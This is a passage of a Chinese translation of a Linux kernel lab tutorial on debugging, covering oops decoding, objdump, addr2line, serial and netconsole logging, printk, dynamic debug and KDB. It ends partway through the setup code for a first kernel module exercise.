<p>告诉我们这是第一个<code>oops</code>(#1)，在一个<code>oops</code>可能导致其它<code>oops</code>时，这一点是很重要的。通常，我们要关注的是第一个<code>oops</code>。此外，<code>oops code</code>（0002）标明了错误类型（见<code>arch/x86/include/asm/trap_pf.h</code>）：</p>
<ul>
<li>Bit 0 &#x3D;&#x3D; 0 表示找不到页，1 表示页保护错误</li>
<li>Bit 1 &#x3D;&#x3D; 0 表示读，1 表示写</li>
<li>Bit 2 &#x3D;&#x3D; 0 表示内核模式，1 表示用户模式</li>
</ul>
<p>在本例中，产生<code>oops</code>(Bit 1 &#x3D;&#x3D; 1)的原因是，尝试在<code>内核模式</code>向一个<code>找不到的内存页</code>执行<code>写操作</code>。</p>
<p>下面使用<code>dmesg</code>产看日志，可以看到寄存器的转储信息，给出了<code>EIP</code>寄存器的值，同时可以注意到<code>bug</code>出现在<code>my_oops_init</code>函数，偏移为5字节(<code>EIP: [&lt;c89d4005&gt;] my_oops_init+0x5</code>)（译者注：？），同时消息还展示了堆栈内容和在<code>oops</code>出现前的调用回溯。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">faust:~/lab-01/modul-oops# dmesg | tail -33</span><br><span class="line">BUG: unable to handle kernel paging request at 00001234</span><br><span class="line">IP: [&lt;c89c3016&gt;] my_oops_init+0x6/0x20 [oops]</span><br><span class="line">  *de = 00000000</span><br><span class="line">Oops: 0000 [#1] PREEMPT DEBUG_PAGEALLOC</span><br><span class="line">last sysfs file: /sys/devices/virtual/net/lo/operstate</span><br><span class="line">Modules linked in: oops(+) netconsole pcnet32 crc32 ide_cd_mod cdrom</span><br><span class="line"></span><br><span class="line">Pid: 2754, comm: insmod Not tainted (2.6.28.4 #2) VMware Virtual Platform</span><br><span class="line">EIP: 0060:[&lt;c89c3016&gt;] EFLAGS: 00010292 CPU: 0</span><br><span class="line">EIP is at my_oops_init+0x6/0x20 [oops]</span><br><span class="line">EAX: 00000000 EBX: fffffffc ECX: c89c3380 EDX: 00000001</span><br><span class="line">ESI: c89c3010 EDI: 00000000 EBP: c57cbe24 ESP: c57cbe1c</span><br><span class="line"> DS: 007b ES: 007b FS: 0000 GS: 0033 SS: 0068</span><br><span class="line">Process insmod (pid: 2754, ti=c57cb000 task=c66ec780 task.ti=c57cb000)</span><br><span class="line">Stack:</span><br><span class="line"> c57cbe34 00000282 c57cbf8c c010102d c57b9280 0000000c c57cbe58 c01708e4</span><br><span class="line"> 00000124 00000000 c89c3380 c57cbe58 c5db1d38 00000001 c89c3380 c57cbe60</span><br><span class="line"> c0170981 c57cbf8c c014b698 00000000 00000000 c57cbf78 c57cbf20 00000580</span><br><span class="line">Call Trace:</span><br><span class="line"> [&lt;c010102d&gt;] ? _stext+0x2d/0x170</span><br><span class="line"> [&lt;c01708e4&gt;] ? __vunmap+0xa4/0xf0</span><br><span class="line"> [&lt;c0170981&gt;] ? vfree+0x21/0x30</span><br><span class="line"> [&lt;c014b698&gt;] ? load_module+0x19b8/0x1a40</span><br><span class="line"> [&lt;c035d083&gt;] ? printk+0x0/0x1a</span><br><span class="line"> [&lt;c035e965&gt;] ? __mutex_unlock_slowpath+0xd5/0x140</span><br><span class="line"> [&lt;c0140da6&gt;] ? trace_hardirqs_on_caller+0x106/0x150</span><br><span class="line"> [&lt;c014b7aa&gt;] ? sys_init_module+0x8a/0x1b0</span><br><span class="line"> [&lt;c0140da6&gt;] ? trace_hardirqs_on_caller+0x106/0x150</span><br><span class="line"> [&lt;c0240a08&gt;] ? trace_hardirqs_on_thunk+0xc/0x10</span><br><span class="line"> [&lt;c0103407&gt;] ? sysenter_do_call+0x12/0x43</span><br><span class="line">Code: &lt;a1&gt; 34 12 00 00 c7 04 24 54 30 9c c8 89 44 24 04 e8 58 a0 99 f7 31</span><br><span class="line">EIP: [&lt;c89c3016&gt;] my_oops_init+0x6/0x20 [oops] SS:ESP 0068:c57cbe1c</span><br><span class="line">---[ end trace 45eeb3d6ea8ff1ed ]---</span><br></pre></td></tr></table></figure>

<p>如果生成一个无效的读调用(<code>#define OP_OOPS OP_READ</code>)，消息基本会是相同的，但是<code>oops code</code>会变成 <code>0000</code>。</p>
<h3 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h3><p>使用<code>objdump</code>工具，可以获得导致<code>oops</code>的指令的详细信息。常用指令有两个，<code>-d</code>用于反汇编，<code>-S</code>用于交织显示<code>C</code>代码和汇编代码，一般组合使用<code>-dS</code>。为了提高解码效率，我们需要用到内核模块的加载地址，它可以在<code>/proc/modules</code>中找到。</p>
<p>下面是一个示例，对上面的内核模块使用<code>objdump</code>命令，识别生成<code>oops</code>的指令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">faust:~/lab-01/modul-oops# cat /proc/modules</span><br><span class="line">oops 1280 1 - Loading 0xc89d4000</span><br><span class="line">netconsole 8352 0 - Live 0xc89ad000</span><br><span class="line">pcnet32 33412 0 - Live 0xc895a000</span><br><span class="line">ide_cd_mod 34952 0 - Live 0xc8903000</span><br><span class="line">crc32 4224 1 pcnet32, Live 0xc888a000</span><br><span class="line">cdrom 34848 1 ide_cd_mod, Live 0xc886d000</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-oops# objdump -dS --adjust-vma=0xc89d4000 oops.ko</span><br><span class="line"></span><br><span class="line">oops.ko:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">c89d4000 &lt;init_module&gt;:</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_READ         0</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_WRITE        1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_OOPS         OP_WRITE</span></span><br><span class="line"></span><br><span class="line">static int my_oops_init (void)</span><br><span class="line">&#123;</span><br><span class="line">c89d4000:       55                      push   %ebp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">error <span class="string">&quot;Unknown op for oops!&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">c89d4001:       31 c0                   xor    %eax,%eax</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_READ         0</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_WRITE        1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_OOPS         OP_WRITE</span></span><br><span class="line"></span><br><span class="line">static int my_oops_init (void)</span><br><span class="line">&#123;</span><br><span class="line">c89d4003:       89 e5                   mov    %esp,%ebp</span><br><span class="line">        int *a;</span><br><span class="line"></span><br><span class="line">        a = (int *) 0x00001234;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">if</span> OP_OOPS == OP_WRITE</span></span><br><span class="line">        *a = 3;</span><br><span class="line">c89d4005:       c7 05 34 12 00 00 03    movl   $0x3,0x1234</span><br><span class="line">c89d400c:       00 00 00</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">error <span class="string">&quot;Unknown op for oops!&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">c89d400f:       5d                      pop    %ebp</span><br><span class="line">c89d4010:       c3                      ret</span><br><span class="line">c89d4011:       eb 0d                   jmp    c89c3020 &lt;cleanup_module&gt;</span><br><span class="line">c89d4013:       90                      nop</span><br><span class="line">c89d4014:       90                      nop</span><br><span class="line">c89d4015:       90                      nop</span><br><span class="line">c89d4016:       90                      nop</span><br><span class="line">c89d4017:       90                      nop</span><br><span class="line">c89d4018:       90                      nop</span><br><span class="line">c89d4019:       90                      nop</span><br><span class="line">c89d401a:       90                      nop</span><br><span class="line">c89d401b:       90                      nop</span><br><span class="line">c89d401c:       90                      nop</span><br><span class="line">c89d401d:       90                      nop</span><br><span class="line">c89d401e:       90                      nop</span><br><span class="line">c89d401f:       90                      nop</span><br><span class="line"></span><br><span class="line">c89d4020 &lt;cleanup_module&gt;:</span><br><span class="line"></span><br><span class="line">static void my_oops_exit (void)</span><br><span class="line">&#123;</span><br><span class="line">c89d4020:       55                      push   %ebp</span><br><span class="line">c89d4021:       89 e5                   mov    %esp,%ebp</span><br><span class="line">&#125;</span><br><span class="line">c89d4023:       5d                      pop    %ebp</span><br><span class="line">c89d4024:       c3                      ret</span><br><span class="line">c89d4025:       90                      nop</span><br><span class="line">c89d4026:       90                      nop</span><br><span class="line">c89d4027:       90                      nop</span><br></pre></td></tr></table></figure>

<p>可以看到，上面得到的造成<code>oops</code>的指令的地址（c89d4005）处的内容是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C89d4005: c7 05 34 12 00 00 03 movl $ 0x3,0x1234</span><br></pre></td></tr></table></figure>

<p>这正是我们期望的——在<code>0x0001234</code>处存储<code>3</code>。</p>
<p><code>/proc/modules</code>中包含内核模块的加载地址，<code>--adjust-vma</code>选项允许我们展示和<code>0xc89d4000</code>相关的指令。</p>
<p><code>-l</code>选项展示插入到汇编代码中的<code>C</code>源码的行号。</p>
<h3 id="addr2line"><a href="#addr2line" class="headerlink" title="addr2line"></a>addr2line</h3><p>一个更简单地找到造成<code>oops</code>的指令的方式，是使用<code>addr2line</code>工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">faust:~/lab-01/modul-oops# addr2line -e oops.o 0x5</span><br><span class="line">/root/lab-01/modul-oops/oops.c:23</span><br></pre></td></tr></table></figure>

<p>其中<code>0x5</code>是生成<code>oops</code>的指令的程序计数（<code>EIP=c89d4005</code>）减去模块加载基址（0xc89d4000，可在<code>/proc/modules</code>中查看）后的值。</p>
<h3 id="minicom"><a href="#minicom" class="headerlink" title="minicom"></a>minicom</h3><p><code>minicom</code>（或其他等效程序，如 <code>picocom</code>, <code>screen</code>），是一个能够用于连接串行端口并与之交互的工具。使用串行端口实在开发阶段分析内核消息或与嵌入式系统进行交互的基本方法。有两种常见的连接方式：</p>
<ul>
<li>我们将使用的设备的<strong>串行端口</strong>是<code>/dev/ttyS0</code></li>
<li>我们将使用的设备的<code>USB</code>端口（FTDI）是<code>/dev/ttyUSB</code></li>
</ul>
<p>如果使用虚拟机，虚拟机启动时会显示我们使用的设备。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">char device redirected to /dev/pts/20 (label virtiocon0)</span><br></pre></td></tr></table></figure>

<p><code>minicom</code>使用示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用COM1连接，115,200比特率</span></span><br><span class="line">minicom -b 115200 -D /dev/ttyS0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">USB串行端口连接</span></span><br><span class="line">minicom -D /dev/ttyUSB0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接虚拟机的串行端口</span></span><br><span class="line">minicom -D /dev/pts/20</span><br></pre></td></tr></table></figure>

<h3 id="netconsole"><a href="#netconsole" class="headerlink" title="netconsole"></a>netconsole</h3><p><code>netconsole</code>是一个可以使用<strong>网络</strong>打印内核日志消息的工具，当磁盘日志系统无法工作、串行端口无法使用或终端没有回显时，使用<code>netconsole</code>很合适。<code>netconsole</code>本身以内核模块的形式存在。</p>
<p>工作时需要以下参数：</p>
<ul>
<li>端口@IP 地址&#x2F;调试站的源接口名称</li>
<li>端口@调试消息被发送到的机器的 IP 地址&#x2F;MAC 地址</li>
</ul>
<p>这些参数可以在模块被<strong>插入内核时</strong>进行配置，也可以在<strong>模块插入后</strong>进行配置（要求编译时开启了 <code>CONFIG_NETCONSOLE_DYNAMIC</code> 选项）。</p>
<p>将<code>netconsole</code>插入内核时的一个配置示例如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alice:~# modprobe netconsole netconsole=6666@192.168.191.130/eth0,6000@192.168.191.1/00:50:56:c0:00:08</span><br></pre></td></tr></table></figure>

<p>IP 地址为<code>192.168.191.130</code>的源机器上的调试信息，会经过<code>6666</code>端口上的<code>eth0</code>接口，发送到 IP 地址为<code>192.168.191.1</code> MAC 地址为<code>00:50:56:c0:00:08</code>的目标机器的<code>6000</code>端口。</p>
<p>在目标机器上可以使用<code>netcat</code>接收消息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob:~ # nc -l -p 6000 -u</span><br></pre></td></tr></table></figure>

<p>或者，目标机器上可以配置<code>syslogd</code>来拦截这些消息。更多信息可在<code>Documentation/networking/netconsole.txt</code>中找到。</p>
<h3 id="Printk-调试"><a href="#Printk-调试" class="headerlink" title="Printk 调试"></a>Printk 调试</h3><blockquote>
<p>两个最经典、最有用的调试工具是你的大脑和 Printf。</p>
</blockquote>
<p>对于调试，大家经常使用一种原始但非常高效的方式：<code>printk</code>调试。尽管可以使用调试器，但它通常不是很有用：简单的<code>bug</code>（比如未初始化的变量，内存管理问题等）可以通过控制消息打印或观察解码后的内核<code>oops</code>信息快速定位。</p>
<p>对于更复杂的<code>bug</code>，即便是调试器也没办法给予我们太多帮助，除非操作系统的结构非常好理解。当调试内核模块时，存在很多位置的因素：多个上下文（同一时刻系统里运行着多个进程和线程），中断，虚拟内存等等。</p>
<p>你可以使用<code>printk</code>把内核消息展示到用户空间。它和<code>printf</code>的功能相似，唯一的区别是，传输的消息可以以字符串”<code>&lt;n&gt;</code>“为前缀，其中<code>n</code>表示错误级别（日志级别），值的范围是<code>0-7</code>。如果不使用”<code>&lt;n&gt;</code>“，也可以使用一些符号常量表示日志级别，对应关系如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">n = 0	KERN_EMERG</span><br><span class="line">n = 1	KERN_ALERT</span><br><span class="line">n = 2	KERN_CRIT</span><br><span class="line">n = 3	KERN_ERR</span><br><span class="line">n = 4	KERN_WARNING</span><br><span class="line">n = 5	KERN_NOTICE</span><br><span class="line">n = 6	KERN_INFO</span><br><span class="line">n = 7	KERN_DEBUG</span><br></pre></td></tr></table></figure>

<p>关于所有日志级别的定义，可以在<code>linux/kern_levels.h</code>文件中找到。基本上，这些级别主要用于告诉系统要把消息发送到哪里：终端，日志文件，或者 <code>/var/log</code> 等等。</p>
<blockquote>
<p>Note.</p>
<p>为了在用户空间展示<code>printk</code>消息，消息的日志级别必须比<code>console_loglevel </code>的级别要高（数值要小）。默认的终端日志级别可以在<code>/proc/sys/kernel/printk</code>进行配置。</p>
<p>比如，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">echo</span> 8 &gt; /proc/sys/kernel/printk</span></span><br></pre></td></tr></table></figure>

<p>以上命令将使得所有内核日志消息都能够在终端中展示。也就是说，日志记录级别必须严格小于<code>console_loglevel</code>变量。例如，如果<code>console_loglevel</code>的值为 5（<code>KERN_NOTICE</code>），则只显示<code>loglevel&lt;=5</code>的消息（即KERN_EMERG、KERN_ALERT、KERN_CRIT、KERN_ERR、KERN_WARNING）。</p>
</blockquote>
<p>控制台重定向消息对于快速查看执行内核代码的效果非常有用，但如果内核遇到无法修复的错误并且系统冻结，它们就不再那么有用了。</p>
<p>在这种情况下，必须查阅系统的日志，因为它们在系统重新启动之间保留信息。这些文件位于<code>/var/log</code>中，是文本文件，在内核运行期间由<code>syslogd</code>和<code>klogd</code>填充。<code>syslogd</code>和<code>klogd</code>从装载的<code>/proc</code>虚拟文件系统中获取信息。原则上，打开<code>syslogd</code>和<code>klogd</code>后，所有来自内核的消息都将转到<code>/var/log/kern.log</code>。</p>
<p>一个更简单的调试方法是使用<code>/var/log/debug</code>文件。它只由来自内核的具有<code>KERN_DEBUG</code>日志级别的printk消息填充。</p>
<p>考虑到生产内核（类似于我们可能正在运行的内核）只包含<strong>发布代码</strong>，我们的模块是少数几个发送以<code>KERN DEBUG</code>为前缀的消息的模块之一。通过这种方式，我们可以通过查找与模块的调试会话相对应的消息，轻松地浏览<code>/var/log/debug</code>信息。</p>
<p>示例如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Clear the debug file of previous information (or possibly a backup)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;New debug session&quot;</span> &gt; /var/log/debug</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Run the tests</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">If there is no critical error causing a panic kernel, check the output</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> a critical error occurs and the machine only responds to a restart,</span></span><br><span class="line">  restart the system and check /var/log/debug.</span><br></pre></td></tr></table></figure>

<p>为了检测错误，打印出的消息应当尽量包含所有感兴趣的信息，但在代码中插入<code>printk</code>可能与编写解决问题的代码一样耗时。因此通常需要是调试消息完整性和将这些消息插入代码所需时间之间进行权衡。</p>
<p>可以使用预定义的常量<code>__FILE__</code>, <code>__LINE__</code> and <code>__func__</code>来提高插入<code>printk</code>语句的效率：</p>
<ul>
<li><p><code>__FILE__</code>被编译器替换为<strong>源文件</strong>的名称</p>
</li>
<li><p><code>__LINE__</code>被编译器替换为当前指令对应的源文件中代码的<strong>行号</strong></p>
</li>
<li><p><code>__func__/__FUNCTION__</code>被编译器替换为当前指令<strong>所在函数</strong>的名称</p>
</li>
</ul>
<blockquote>
<p>Note.</p>
<p><code>__FILE__</code>和<code>__LINE__</code>是<code>ANSI C</code>规范的一部分：<code>__func_</code>是<code>C99</code>规范的一部分；<code>__FUNCTION __</code>是一个<code>GNU C</code>扩展，不可移植；不过，由于我们为<code>Linux</code>内核编写代码，因此可以毫无问题地使用它们。</p>
</blockquote>
<p>下面的<strong>宏定义</strong>可以在这样的情况下使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define PRINT_DEBUG \</span></span><br><span class="line"><span class="language-bash">       printk (KERN_DEBUG <span class="string">&quot;[% s]: FUNC:% s: LINE:% d \ n&quot;</span>, __FILE__,</span></span><br><span class="line">               __FUNCTION__, __LINE__)</span><br></pre></td></tr></table></figure>

<p>之后，在每个我们想要观察是否执行到的位置，插入<code>PRINT_DEBUG</code>即可。这是一个简单快速的方式，且可以用于仔细的分系。</p>
<p><code>dmesg</code>命令被用来观察使用<code>printk</code>打印，但未在终端输出的消息。</p>
<p>运行以下命令，可以删除日志文件中之前的消息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /dev/null &gt; /var/log/debug</span><br></pre></td></tr></table></figure>

<p>运行以下命令，可以删除当前能被<code>dmesg</code>输出的消息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dmesg -c</span><br></pre></td></tr></table></figure>

<h3 id="dyndbg-动态调试"><a href="#dyndbg-动态调试" class="headerlink" title="dyndbg 动态调试"></a>dyndbg 动态调试</h3><p>动态调试能够显著地减少要输出的消息的数量。为了使用动态调试函数，编译内核时要开启<code>CONFIG_DYNAMIC_DEBUG</code>选项，之后就可以使用<code>pr_debug()</code>, <code>dev_dbg()</code>, <code>print_hex_dump_debug()</code>, <code>print_hex_dump_bytes()</code>等函数。</p>
<p>当<code>debugfs</code>被挂载到<code>/sys/kernel/debug</code>时，<code>/sys/kernel/debug/dynamic_debug/control</code>文件用于过滤消息，也可以通过它查看已经存在的过滤器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount -t debugfs none /debug</span><br></pre></td></tr></table></figure>

<p><code>Debugfs</code>是一个简单的文件系统，用作内核空间接口和用户空间接口来配置不同的调试选项。任何调试工具都可以在<code>debugfs</code>中创建和使用自己的文件&#x2F;文件夹。</p>
<p>比如，为了展示动态调试（dyndbg）中已经存在的过滤器，可以使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /debug/dynamic_debug/control</span><br></pre></td></tr></table></figure>

<p>如郭想要接收<code>svsock.c</code>文件的第<strong>1603</strong>行输出的调试消息，可以使用以下命令进行设置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;file svcsock.c line 1603 +p&#x27; &gt; /debug/dynamic_debug/control</span><br></pre></td></tr></table></figure>

<h4 id="动态调试选项"><a href="#动态调试选项" class="headerlink" title="动态调试选项"></a>动态调试选项</h4><ul>
<li><p>func - 根据所在函数的函数名过滤消息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;func svc_tcp_accept +p&#x27; &gt; /debug/dynamic_debug/control</span><br></pre></td></tr></table></figure>
</li>
<li><p>file - 根据源文件名过滤消息，可以使用绝对路径和相对路径，以及内核树路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file svcsock.c</span><br><span class="line">file kernel/freezer.c</span><br><span class="line">file /usr/src/packages/BUILD/sgi-enhancednfs-1.4/default/net/sunrpc/svcsock.c</span><br></pre></td></tr></table></figure>
</li>
<li><p>module - 根据模块名过滤消息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">module sunrpc</span><br></pre></td></tr></table></figure>
</li>
<li><p>format - 只显示包含以下字符串的消息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">format &quot;nfsd: SETATTR&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>line - 根据行号启用调试函数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Triggers debug messages between lines 1603 and 1605 <span class="keyword">in</span> the svcsock.c file</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;file svcsock.c line 1603-1605 +p&#x27;</span> &gt; /sys/kernel/debug/dynamic_debug/control</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enables debug messages from the beginning of the file to line 1605</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;file svcsock.c line -1605 +p&#x27;</span> &gt; /sys/kernel/debug/dynamic_debug/control</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>除了以上选项，还可以使用操作符（<code>+</code> <code> -</code> <code> =</code>）添加、删除或设置一系列<code>flags</code></p>
<ul>
<li>p  激活<code>pr_debug()</code></li>
<li>f 在输出消息中包含函数名</li>
<li>l 在输出消息中包含行号</li>
<li>m 在输出消息中包含模块名</li>
<li>t 在输出消息中包含线程 id ，如果不是从中断上下文中调用的话</li>
<li>_ 不设置任何标志</li>
</ul>
<h3 id="KDB内核调试器"><a href="#KDB内核调试器" class="headerlink" title="KDB内核调试器"></a>KDB内核调试器</h3><p>内核调试器已被证明对促进开发和调试过程非常有用。它的主要优点之一是可以执行实时调试。这使我们能够实时监控对内存的访问，甚至在调试时修改内存。从<code>2.6.26-rci</code>版本开始，调试器已经集成在主流内核中。KDB不是源调试器，但要进行完整的分析，它可以并行使用<code>gdb</code>和符号文件——请参阅<a href="https://linux-kernel-labs.github.io/refs/heads/master/so2/lab1-intro.html#gdb-intro">gdb调试部分</a></p>
<p>要使用<code>KDB</code>，有以下选项：</p>
<ul>
<li><p>非<code>usb</code>键盘+<code>VGA</code>文本控制台</p>
</li>
<li><p>串行端口控制台</p>
</li>
<li><p><code>USB EHCI</code>调试端口</p>
</li>
</ul>
<p>对于本实验，我们将使用连接到主机的串行接口。以下命令将通过串行端口激活GDB：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo hvc0 &gt; /sys/module/kgdboc/parameters/kgdboc</span><br></pre></td></tr></table></figure>

<p><code>KDB</code>是一个<code>stop</code>模式调试器，这意味着当它处于活动状态时，所有其他进程都会停止。在执行过程中，可以使用以下<code>Sys Rq</code>命令强制内核进入<code>KDB</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo g &gt; /proc/sysrq-trigger</span><br></pre></td></tr></table></figure>

<p>或者通过在连接到串行端口（例如使用minicom）的终端中使用组合键<code>Ctrl+O g</code>。</p>
<p>KDB有各种命令来控制和定义被调试系统的上下文：</p>
<ul>
<li><p>lsmod、ps、kill、dmesg、env、bt（backtrace，回溯）</p>
</li>
<li><p>转储跟踪日志</p>
</li>
<li><p>硬件断点</p>
</li>
<li><p>修改内存</p>
</li>
</ul>
<p>为了更好地描述可用的命令，可以使用<code>KDBshell</code>中的<code>help</code>命令。在下一个示例中，您可以注意到一个简单的<code>KDB</code>使用示例，它设置了一个硬件断点来监视<code>mVar</code>变量的更改</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">trigger KDB</span></span><br><span class="line">echo g &gt; /proc/sysrq-trigger</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or <span class="keyword">if</span> we are connected to the serial port issue</span></span><br><span class="line">Ctrl-O g</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">breakpoint on write access to the mVar variable</span></span><br><span class="line"><span class="meta prompt_">kdb&gt; </span><span class="language-bash">bph mVar dataw</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">return</span> from KDB</span></span><br><span class="line"><span class="meta prompt_">kdb&gt; </span><span class="language-bash">go</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Note.</p>
<p>如果你想学习如何轻松浏览Linux源代码以及如何调试内核代码，请阅读“<a href="https://linux-kernel-labs.github.io/refs/heads/master/so2/lab1-intro.html#good-to-know">Good to know</a> ”部分。</p>
</blockquote>
<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h3 id="基本准备"><a href="#基本准备" class="headerlink" title="基本准备"></a>基本准备</h3><p>下载内核源码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.4.98.tar.xz</span><br><span class="line">unxz linux-5.4.98.tar.xz</span><br><span class="line">tar -xf linux-5.4.98.tar</span><br></pre></td></tr></table></figure>

<p>配置编译选项，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">依次进入到 Kernel hacking -&gt; Compile-time checks and compiler options，然后勾选如下选项Compile the kernel with debug info，以便于调试</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果要使用 kgdb 调试内核，则需要选中 KGDB: kernel debugger，并选中 KGDB 下的所有选项。</span></span><br></pre></td></tr></table></figure>

<p>根据配置准备必要文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make prepare</span><br></pre></td></tr></table></figure>

<p>创建内核模块实验目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir linuxkm</span><br><span class="line">code linuxkm  # 使用vscode</span><br></pre></td></tr></table></figure>

<p>设置vscode 头文件目录，添加以下三个路径，如果头文件仍然显示错误，建议禁用错误波形曲线</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/linux-5.4.98/include/**</span><br><span class="line">~/linux-5.4.98/arch/x86/include/**</span><br><span class="line">&quot;~/linux-5.4.98/arch/x86/include/generated/**&quot;</span><br></pre></td></tr></table></figure>

<p>Makefile</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">KDIR =  ~/linux-5.4.98/</span><br><span class="line"></span><br><span class="line"><span class="section">kbuild:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=`pwd`</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=`pwd` clean</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: kbuild clean</span></span><br></pre></td></tr></table></figure>

<p>Kbuild</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">EXTRA_CFLAGS = -Wall -g</span><br><span class="line"></span><br><span class="line">obj-m        = modul.o</span><br></pre></td></tr></table></figure>

<p>modul.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;My kernel module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Me&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">dummy_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(<span class="string">&quot;Hi\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">dummy_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(<span 